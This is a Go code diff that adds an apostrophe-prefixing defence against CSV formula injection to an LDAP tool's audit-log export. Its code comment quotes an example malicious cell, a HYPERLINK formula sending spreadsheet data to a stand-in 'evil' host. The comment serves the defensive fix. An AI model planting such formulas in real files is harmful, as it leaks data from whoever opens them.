@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net/http"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/ldapwarden/ldapwarden/internal/audit"
@@ -106,7 +107,7 @@ func (s *Server) handleExportAuditLogs(w http.ResponseWriter, r *http.Request) {
 	}
 
 	for _, entry := range logs {
-		if err := cw.Write([]string{
+		if err := cw.Write(neutralizeCSVFormulas([]string{
 			entry.CreatedAt.UTC().Format(time.RFC3339),
 			entry.ActorUID,
 			entry.ActorDN,
@@ -117,10 +118,27 @@ func (s *Server) handleExportAuditLogs(w http.ResponseWriter, r *http.Request) {
 			formatDetails(entry.Details),
 			entry.IPAddress,
 			entry.UserAgent,
-		}); err != nil {
+		})); err != nil {
 			return
 		}
 	}
+}
+
+// neutralizeCSVFormulas defuses cells a spreadsheet would evaluate. Several
+// columns hold text nobody vetted: a failed login records the username exactly
+// as typed — by anyone, unauthenticated — and every row records the client's
+// User-Agent. A cell such as =HYPERLINK("https://evil/?"&A1) is a formula to
+// Excel or LibreOffice, run when the auditor opens the export. A leading
+// apostrophe makes the spreadsheet read the cell as text and is not displayed
+// (OWASP's recommendation for CSV injection). Done in place and returned for
+// call-site convenience.
+func neutralizeCSVFormulas(cells []string) []string {
+	for i, c := range cells {
+		if c != "" && strings.ContainsRune("=+-@\t\r", rune(c[0])) {
+			cells[i] = "'" + c
+		}
+	}
+	return cells
 }
 
 // formatChanges renders details["changes"] as "field: old → new" lines. Masked
